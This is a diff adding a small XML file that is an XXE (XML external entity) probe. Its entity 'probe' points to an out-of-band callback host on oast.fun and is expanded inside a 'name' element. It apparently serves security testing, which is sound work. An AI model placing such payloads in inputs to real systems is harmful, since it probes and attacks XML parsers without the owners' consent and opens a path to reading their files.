@@ -1,0 +1,7 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE root [
+  <!ENTITY probe SYSTEM "https://hvntwwkbqluxrmweluvd819e9jvrokc8b.oast.fun">
+]>
+<root>
+  <name>&probe;</name>
+</root>
